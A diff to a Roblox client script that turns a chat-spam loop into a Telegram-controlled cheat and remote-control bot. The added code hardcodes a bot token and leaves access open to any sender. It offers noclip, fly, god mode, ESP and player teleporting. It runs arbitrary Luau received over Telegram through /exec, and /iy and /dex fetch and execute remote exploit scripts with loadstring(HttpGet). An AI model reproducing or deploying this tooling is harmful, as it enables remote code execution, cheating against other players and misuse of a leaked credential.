@@ -1,30 +1,637 @@
 -- LocalScript
--- Put in StarterPlayer > StarterPlayerScripts
-while true do
+-- Telegram Polling (Instant Responses, Expanded Command Suite)
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
 local TextChatService = game:GetService("TextChatService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local Stats = game:GetService("Stats")
+local Lighting = game:GetService("Lighting")
+local UserInputService = game:GetService("UserInputService")
 
-local message = "uwu"
+local TOKEN = "7582564177:AAEox-Qs9hEu1RZKV6tqBh-imAvm4Qi31tc" 
+local ADMIN_IDS = {} -- Optional: Add your Telegram User IDs / Group IDs here to restrict usage
 
-if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-	-- New chat
-	local textChannels = TextChatService:WaitForChild("TextChannels")
-	local general = textChannels:FindFirstChild("RBXGeneral")
+if TOKEN == "" or TOKEN == "YOUR_BOT_TOKEN_HERE" then
+	warn("Configure the Telegram token first.")
+	return
+end
 
-	if general then
-		general:SendAsync(message)
+local API = "https://api.telegram.org/bot" .. TOKEN .. "/"
+local lastUpdateId = 0
+local running = true
+
+-- Active toggle states
+local noclipEnabled = false
+local noclipConn = nil
+local flyEnabled = false
+local flyConn = nil
+local spinEnabled = false
+local spinConn = nil
+local attachTarget = nil
+local attachConn = nil
+local espEnabled = false
+local godEnabled = false
+local godConn = nil
+local infJumpEnabled = false
+local infJumpConn = nil
+local spawnedPlatform = nil
+
+local function getPlayer(query)
+	if not query or query == "" then return nil end
+	query = query:lower()
+	for _, player in ipairs(Players:GetPlayers()) do
+		if player.Name:lower():sub(1, #query) == query or player.DisplayName:lower():sub(1, #query) == query then
+			return player
+		end
 	end
-else
-	-- Old chat
-	local ReplicatedStorage = game:GetService("ReplicatedStorage")
-	local events = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+	return nil
+end
 
-	if events then
-		local sayMessageRequest = events:FindFirstChild("SayMessageRequest")
+local function telegramGet(method, params)
+	local url = API .. method
+	if params then
+		local query = {}
+		for key, value in pairs(params) do
+			table.insert(query, HttpService:UrlEncode(key) .. "=" .. HttpService:UrlEncode(tostring(value)))
+		end
+		url ..= "?" .. table.concat(query, "&")
+	end
 
-		if sayMessageRequest then
-			sayMessageRequest:FireServer(message, "All")
+	local ok, response = pcall(function() return game:HttpGet(url) end)
+	if not ok then return nil end
+
+	local decoded, data = pcall(function() return HttpService:JSONDecode(response) end)
+	if not decoded then return nil end
+	return data
+end
+
+local function sendMessage(chatId, text, parseMode)
+	local params = { chat_id = chatId, text = text }
+	if parseMode then params.parse_mode = parseMode end
+	telegramGet("sendMessage", params)
+end
+
+local function isAuthorized(userId)
+	if #ADMIN_IDS == 0 then return true end
+	for _, id in ipairs(ADMIN_IDS) do
+		if id == userId then return true end
+	end
+	return false
+end
+
+local function executeCommand(fullText, chatId, userId)
+	if not isAuthorized(userId) then
+		sendMessage(chatId, "Unauthorized access.")
+		return
+	end
+
+	local args = string.split(fullText:match("^%s*(.-)%s*$"), " ")
+	local command = string.lower(table.remove(args, 1))
+
+	local localPlayer = Players.LocalPlayer
+	local character = localPlayer.Character
+	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+	local rootPart = character and character:FindFirstChild("HumanoidRootPart")
+
+	-- Core Information & Group IDs
+	if command == "/bot" then
+		sendMessage(chatId, "Roblox bot online and listening! ⚡")
+
+	elseif command == "/chatid" or command == "/telegramgroup" then
+		sendMessage(chatId, "📌 *Current Telegram Chat/Group ID:* `" .. tostring(chatId) .. "`\nSender User ID: `" .. tostring(userId) .. "`", "Markdown")
+
+	elseif command == "/groupid" or command == "/group" then
+		local ownerType = game.CreatorType.Name
+		local ownerId = game.CreatorId
+		local msg = "🏰 *Game Creator Info:*\n" ..
+		            "Type: " .. ownerType .. "\n" ..
+		            "ID: `" .. tostring(ownerId) .. "`\n"
+		if game.CreatorType == Enum.CreatorType.Group then
+			msg ..= "🔗 [View Roblox Group](https://www.roblox.com/groups/" .. tostring(ownerId) .. ")"
+		end
+		sendMessage(chatId, msg, "Markdown")
+
+	elseif command == "/ingroup" then
+		local targetQuery = args[1]
+		local groupId = tonumber(args[2])
+
+		if targetQuery and not groupId then
+			groupId = tonumber(targetQuery)
+			targetQuery = localPlayer.Name
+		end
+
+		if not groupId then
+			sendMessage(chatId, "Usage: /ingroup [player] <groupId>")
+			return
+		end
+
+		local targetPlayer = getPlayer(targetQuery) or localPlayer
+		local rank = targetPlayer:GetRankInGroup(groupId)
+		local role = targetPlayer:GetRoleInGroup(groupId)
+
+		sendMessage(chatId, string.format("👥 *Group Status for %s:*\nGroup ID: %d\nRank: %d\nRole: %s", targetPlayer.Name, groupId, rank, role), "Markdown")
+
+	elseif command == "/jobid" then
+		local link = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+		local msg = "🆔 *JobId:* `" .. game.JobId .. "`\n" ..
+		            "📍 *PlaceId:* `" .. game.PlaceId .. "`\n\n" ..
+		            "🔗 [Click to Direct-Join Server](" .. link .. ")"
+		sendMessage(chatId, msg, "Markdown")
+
+	elseif command == "/join" then
+		local targetJobId = args[1]
+		local targetPlaceId = tonumber(args[2]) or game.PlaceId
+
+		if not targetJobId or targetJobId == "" then
+			sendMessage(chatId, "Usage: /join <jobId> [placeId]")
+			return
+		end
+
+		sendMessage(chatId, "Teleporting to JobId: " .. targetJobId)
+		TeleportService:TeleportToPlaceInstance(targetPlaceId, targetJobId, localPlayer)
+
+	elseif command == "/serverinfo" then
+		local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+		local uptime = math.floor(workspace.DistributedGameTime)
+		local msg = string.format("📊 *Server Info:*\nPlayers: %d/%d\nPing: %d ms\nUptime: %d sec\nPlaceId: %d", 
+			#Players:GetPlayers(), Players.MaxPlayers, ping, uptime, game.PlaceId)
+		sendMessage(chatId, msg, "Markdown")
+
+	elseif command == "/info" then
+		sendMessage(chatId, "Player: " .. localPlayer.Name .. "\nUserId: " .. localPlayer.UserId .. "\nPlaceId: " .. game.PlaceId)
+
+	elseif command == "/players" then
+		local names = {}
+		for _, player in ipairs(Players:GetPlayers()) do
+			table.insert(names, player.Name .. " (@" .. player.DisplayName .. ")")
+		end
+		sendMessage(chatId, "Players (" .. #names .. "):\n" .. table.concat(names, "\n"))
+
+	elseif command == "/pos" then
+		if rootPart then
+			local pos = rootPart.Position
+			sendMessage(chatId, string.format("Position:\nX: %.2f\nY: %.2f\nZ: %.2f", pos.X, pos.Y, pos.Z))
+		else
+			sendMessage(chatId, "Character position unavailable.")
+		end
+
+	-- Teleportation & Movement Mechanics
+	elseif command == "/goto" then
+		local target = getPlayer(args[1])
+		if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") and rootPart then
+			rootPart.CFrame = target.Character.HumanoidRootPart.CFrame
+			sendMessage(chatId, "Teleported to " .. target.Name)
+		else
+			sendMessage(chatId, "Player not found or character invalid.")
+		end
+
+	elseif command == "/to" then
+		local x, y, z = tonumber(args[1]), tonumber(args[2]), tonumber(args[3])
+		if x and y and z and rootPart then
+			rootPart.CFrame = CFrame.new(x, y, z)
+			sendMessage(chatId, string.format("Teleported to X: %.1f, Y: %.1f, Z: %.1f", x, y, z))
+		else
+			sendMessage(chatId, "Usage: /to <x> <y> <z>")
+		end
+
+	elseif command == "/attach" then
+		local target = getPlayer(args[1])
+		if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
+			attachTarget = target
+			if not attachConn then
+				attachConn = RunService.Heartbeat:Connect(function()
+					if attachTarget and attachTarget.Character and attachTarget.Character:FindFirstChild("HumanoidRootPart") and rootPart then
+						rootPart.CFrame = attachTarget.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
+					end
+				end)
+			end
+			sendMessage(chatId, "Attached to " .. target.Name)
+		else
+			sendMessage(chatId, "Target not found.")
+		end
+
+	elseif command == "/unattach" then
+		attachTarget = nil
+		if attachConn then
+			attachConn:Disconnect()
+			attachConn = nil
+		end
+		sendMessage(chatId, "Unattached from player.")
+
+	elseif command == "/fly" then
+		local flySpeed = tonumber(args[1]) or 50
+		flyEnabled = true
+		if rootPart then
+			local bv = Instance.new("BodyVelocity")
+			bv.Name = "BotFlyVelocity"
+			bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
+			bv.Parent = rootPart
+
+			local bg = Instance.new("BodyGyro")
+			bg.Name = "BotFlyGyro"
+			bg.MaxTorque = Vector3.new(1e6, 1e6, 1e6)
+			bg.Parent = rootPart
+
+			if not flyConn then
+				flyConn = RunService.RenderStepped:Connect(function()
+					if flyEnabled and rootPart and workspace.CurrentCamera then
+						local cam = workspace.CurrentCamera
+						bv.Velocity = cam.CFrame.LookVector * flySpeed
+						bg.CFrame = cam.CFrame
+					else
+						bv:Destroy()
+						bg:Destroy()
+					end
+				end)
+			end
+			sendMessage(chatId, "Flying enabled (Speed: " .. flySpeed .. ")")
+		end
+
+	elseif command == "/unfly" then
+		flyEnabled = false
+		if flyConn then
+			flyConn:Disconnect()
+			flyConn = nil
+		end
+		if rootPart then
+			if rootPart:FindFirstChild("BotFlyVelocity") then rootPart.BotFlyVelocity:Destroy() end
+			if rootPart:FindFirstChild("BotFlyGyro") then rootPart.BotFlyGyro:Destroy() end
+		end
+		sendMessage(chatId, "Flying disabled.")
+
+	elseif command == "/spin" then
+		local speed = tonumber(args[1]) or 30
+		spinEnabled = true
+		if not spinConn then
+			spinConn = RunService.Stepped:Connect(function()
+				if spinEnabled and rootPart then
+					rootPart.CFrame = rootPart.CFrame * CFrame.Angles(0, math.rad(speed), 0)
+				end
+			end)
+		end
+		sendMessage(chatId, "Spinning enabled.")
+
+	elseif command == "/unspin" then
+		spinEnabled = false
+		if spinConn then
+			spinConn:Disconnect()
+			spinConn = nil
+		end
+		sendMessage(chatId, "Spinning disabled.")
+
+	elseif command == "/god" then
+		godEnabled = true
+		if not godConn then
+			godConn = RunService.Heartbeat:Connect(function()
+				if godEnabled and humanoid then
+					humanoid.Health = humanoid.MaxHealth
+				end
+			end)
+		end
+		sendMessage(chatId, "Godmode enabled (Health Lock). 🛡️")
+
+	elseif command == "/ungod" then
+		godEnabled = false
+		if godConn then
+			godConn:Disconnect()
+			godConn = nil
+		end
+		sendMessage(chatId, "Godmode disabled.")
+
+	elseif command == "/infjump" then
+		infJumpEnabled = true
+		if not infJumpConn then
+			infJumpConn = UserInputService.JumpRequest:Connect(function()
+				if infJumpEnabled and humanoid then
+					humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+				end
+			end)
+		end
+		sendMessage(chatId, "Infinite Jump enabled. 🦘")
+
+	elseif command == "/uninfjump" then
+		infJumpEnabled = false
+		if infJumpConn then
+			infJumpConn:Disconnect()
+			infJumpConn = nil
+		end
+		sendMessage(chatId, "Infinite Jump disabled.")
+
+	elseif command == "/platform" then
+		if rootPart then
+			if spawnedPlatform then spawnedPlatform:Destroy() end
+			spawnedPlatform = Instance.new("Part")
+			spawnedPlatform.Name = "BotPlatform"
+			spawnedPlatform.Size = Vector3.new(8, 1, 8)
+			spawnedPlatform.Anchored = true
+			spawnedPlatform.CFrame = rootPart.CFrame * CFrame.new(0, -3.5, 0)
+			spawnedPlatform.Material = Enum.Material.SmoothPlastic
+			spawnedPlatform.BrickColor = BrickColor.new("Bright blue")
+			spawnedPlatform.Parent = workspace
+			sendMessage(chatId, "Platform spawned under player.")
+		end
+
+	elseif command == "/unplatform" then
+		if spawnedPlatform then
+			spawnedPlatform:Destroy()
+			spawnedPlatform = nil
+			sendMessage(chatId, "Platform removed.")
+		else
+			sendMessage(chatId, "No platform found.")
+		end
+
+	elseif command == "/ws" then
+		local speed = tonumber(args[1])
+		if humanoid and speed then
+			humanoid.WalkSpeed = speed
+			sendMessage(chatId, "WalkSpeed set to " .. speed)
+		else
+			sendMessage(chatId, "Usage: /ws <number>")
+		end
+
+	elseif command == "/jp" then
+		local jump = tonumber(args[1])
+		if humanoid and jump then
+			humanoid.JumpPower = jump
+			humanoid.UseJumpPower = true
+			sendMessage(chatId, "JumpPower set to " .. jump)
+		else
+			sendMessage(chatId, "Usage: /jp <number>")
+		end
+
+	elseif command == "/hipheight" then
+		local height = tonumber(args[1])
+		if humanoid and height then
+			humanoid.HipHeight = height
+			sendMessage(chatId, "HipHeight set to " .. height)
+		else
+			sendMessage(chatId, "Usage: /hipheight <number>")
+		end
+
+	elseif command == "/gravity" then
+		local grav = tonumber(args[1])
+		if grav then
+			workspace.Gravity = grav
+			sendMessage(chatId, "Workspace Gravity set to " .. grav)
+		else
+			sendMessage(chatId, "Usage: /gravity <number>")
+		end
+
+	elseif command == "/noclip" then
+		noclipEnabled = true
+		if not noclipConn then
+			noclipConn = RunService.Stepped:Connect(function()
+				if noclipEnabled and character then
+					for _, part in ipairs(character:GetDescendants()) do
+						if part:IsA("BasePart") then part.CanCollide = false end
+					end
+				end
+			end)
+		end
+		sendMessage(chatId, "Noclip enabled. 👻")
+
+	elseif command == "/clip" then
+		noclipEnabled = false
+		if noclipConn then
+			noclipConn:Disconnect()
+			noclipConn = nil
+		end
+		sendMessage(chatId, "Noclip disabled.")
+
+	-- Visual & Camera Manipulations
+	elseif command == "/fov" then
+		local fovNum = tonumber(args[1])
+		if fovNum and workspace.CurrentCamera then
+			workspace.CurrentCamera.FieldOfView = math.clamp(fovNum, 1, 120)
+			sendMessage(chatId, "Camera FOV set to " .. fovNum)
+		else
+			sendMessage(chatId, "Usage: /fov <1-120>")
+		end
+
+	elseif command == "/day" then
+		Lighting.ClockTime = 14
+		sendMessage(chatId, "Time set to Day ☀️")
+
+	elseif command == "/night" then
+		Lighting.ClockTime = 0
+		sendMessage(chatId, "Time set to Night 🌙")
+
+	elseif command == "/time" then
+		local clockVal = tonumber(args[1])
+		if clockVal then
+			Lighting.ClockTime = clockVal
+			sendMessage(chatId, "ClockTime set to " .. clockVal)
+		else
+			sendMessage(chatId, "Usage: /time <0-24>")
+		end
+
+	elseif command == "/invis" then
+		if character then
+			for _, part in ipairs(character:GetDescendants()) do
+				if part:IsA("BasePart") or part:IsA("Decal") then
+					part.Transparency = 1
+				end
+			end
+			sendMessage(chatId, "Character made invisible locally.")
+		end
+
+	elseif command == "/vis" then
+		if character then
+			for _, part in ipairs(character:GetDescendants()) do
+				if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+					part.Transparency = 0
+				elseif part:IsA("Decal") then
+					part.Transparency = 0
+				end
+			end
+			sendMessage(chatId, "Character made visible.")
+		end
+
+	elseif command == "/btools" then
+		local backpack = localPlayer:FindFirstChildOfClass("Backpack")
+		if backpack then
+			Instance.new("HopperBin", backpack).BinType = Enum.BinType.Clone
+			Instance.new("HopperBin", backpack).BinType = Enum.BinType.Hammer
+			Instance.new("HopperBin", backpack).BinType = Enum.BinType.Grab
+			sendMessage(chatId, "Client-side BTools added.")
+		end
+
+	elseif command == "/sit" then
+		if humanoid then humanoid.Sit = true sendMessage(chatId, "Sitting.") end
+
+	elseif command == "/freeze" then
+		if rootPart then rootPart.Anchored = true sendMessage(chatId, "Frozen ❄️") end
+
+	elseif command == "/unfreeze" then
+		if rootPart then rootPart.Anchored = false sendMessage(chatId, "Unfrozen 🔥") end
+
+	elseif command == "/kill" then
+		if humanoid then humanoid.Health = 0 sendMessage(chatId, "Character died. 💀") end
+
+	-- Camera Control & Spectating
+	elseif command == "/view" then
+		local target = getPlayer(args[1])
+		if target and target.Character and target.Character:FindFirstChildOfClass("Humanoid") then
+			workspace.CurrentCamera.CameraSubject = target.Character:FindFirstChildOfClass("Humanoid")
+			sendMessage(chatId, "Viewing player: " .. target.Name)
+		else
+			sendMessage(chatId, "Target not found.")
+		end
+
+	elseif command == "/unview" then
+		if humanoid then
+			workspace.CurrentCamera.CameraSubject = humanoid
+			sendMessage(chatId, "Camera reset to local player.")
+		end
+
+	-- Chat & Visual Overlays
+	elseif command == "/esp" then
+		espEnabled = not espEnabled
+		for _, p in ipairs(Players:GetPlayers()) do
+			if p ~= localPlayer and p.Character then
+				local hl = p.Character:FindFirstChild("BotESP")
+				if espEnabled then
+					if not hl then
+						hl = Instance.new("Highlight")
+						hl.Name = "BotESP"
+						hl.FillColor = Color3.fromRGB(255, 0, 0)
+						hl.Parent = p.Character
+					end
+				else
+					if hl then hl:Destroy() end
+				end
+			end
+		end
+		sendMessage(chatId, "ESP Highlights " .. (espEnabled and "Enabled" or "Disabled"))
+
+	elseif command == "/chat" then
+		local message = table.concat(args, " ")
+		if message ~= "" then
+			if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+				TextChatService.TextChannels.RBXGeneral:SendAsync(message)
+			else
+				ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents").SayMessageRequest:FireServer(message, "All")
+			end
+			sendMessage(chatId, "Sent chat: " .. message)
+		end
+
+	-- External Admin Scripts & Loadstrings
+	elseif command == "/iy" then
+		sendMessage(chatId, "Loading Infinite Yield...")
+		task.spawn(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+		end)
+
+	elseif command == "/dex" then
+		sendMessage(chatId, "Loading Dark Dex V4...")
+		task.spawn(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
+		end)
+
+	-- Server & Script Execution
+	elseif command == "/exec" then
+		local luaCode = table.concat(args, " ")
+		if luaCode == "" then
+			sendMessage(chatId, "Usage: /exec <code>")
+			return
+		end
+
+		local fn, compileErr = loadstring(luaCode)
+		if fn then
+			local success, runtimeErr = pcall(fn)
+			if success then
+				sendMessage(chatId, "Execution Successful.")
+			else
+				sendMessage(chatId, "Runtime Error: " .. tostring(runtimeErr))
+			end
+		else
+			sendMessage(chatId, "Compile Error: " .. tostring(compileErr))
+		end
+
+	elseif command == "/rejoin" then
+		sendMessage(chatId, "Rejoining server...")
+		TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, localPlayer)
+
+	elseif command == "/serverhop" then
+		sendMessage(chatId, "Server hopping...")
+		TeleportService:Teleport(game.PlaceId, localPlayer)
+
+	elseif command == "/kick" then
+		local reason = table.concat(args, " ")
+		if reason == "" then
+			reason = "Kicked remotely via Telegram bot command."
+		end
+		sendMessage(chatId, "Kicked local player with reason: \"" .. reason .. "\"")
+		localPlayer:Kick(reason)
+
+	elseif command == "/help" then
+		sendMessage(
+			chatId,
+			"📜 *Commands Directory:*\n\n" ..
+			"👥 *Group & Telegram:*\n" ..
+			"/chatid - Get Telegram Group/Chat ID\n" ..
+			"/groupid - Get Roblox group info & link\n" ..
+			"/ingroup [player] <groupId> - Rank check\n\n" ..
+			"🔗 *Joining & Info:*\n" ..
+			"/jobid - Direct-join link & JobID\n" ..
+			"/join <jobId> [placeId] - Hop to JobID\n" ..
+			"/serverinfo / /info / /pos / /players\n\n" ..
+			"🏃 *Movement & Teleporting:*\n" ..
+			"/goto <name> - Teleport to player\n" ..
+			"/to <x> <y> <z> - Teleport coordinates\n" ..
+			"/attach <name> / /unattach - Sticky follower\n" ..
+			"/fly <speed> / /unfly - Fly mode\n" ..
+			"/god / /ungod - Infinite health lock\n" ..
+			"/infjump / /uninfjump - Air jump\n" ..
+			"/platform / /unplatform - Floating block\n" ..
+			"/spin <speed> / /unspin - Continuous spin\n" ..
+			"/noclip / /clip - Walk through walls\n" ..
+			"/ws <num> / /jp <num> / /hipheight <num>\n" ..
+			"/gravity <num> - Set gravity\n\n" ..
+			"👁️ *Visuals & World:*\n" ..
+			"/fov <num> - Adjust camera field of view\n" ..
+			"/day / /night / /time <0-24> - World time\n" ..
+			"/view <name> / /unview - Camera spectate\n" ..
+			"/invis / /vis - Local transparency\n" ..
+			"/esp - Player outlines toggle\n\n" ..
+			"⚙️ *Scripts & Server Admin:*\n" ..
+			"/iy - Launch Infinite Yield admin script\n" ..
+			"/dex - Launch Dark Dex explorer script\n" ..
+			"/btools - Get building tools\n" ..
+			"/chat <msg> - Send Roblox chat\n" ..
+			"/exec <code> - Execute custom Luau\n" ..
+			"/sit / /freeze / /unfreeze / /kill\n" ..
+			"/rejoin / /serverhop / /kick [reason]",
+			"Markdown"
+		)
+	end
+end
+
+local function pollTelegram()
+	local data = telegramGet("getUpdates", {
+		offset = lastUpdateId + 1,
+		timeout = 0,
+		allowed_updates = "message"
+	})
+
+	if not data or not data.ok or not data.result then return end
+
+	for _, update in ipairs(data.result) do
+		lastUpdateId = update.update_id
+		local message = update.message
+		if message and message.text and message.chat then
+			local senderId = message.from and message.from.id or 0
+			task.spawn(executeCommand, message.text, message.chat.id, senderId)
 		end
 	end
 end
-wait(5)
-end
+
+task.spawn(function()
+	while running do
+		pollTelegram()
+		task.wait(0.2)
+	end
+end)
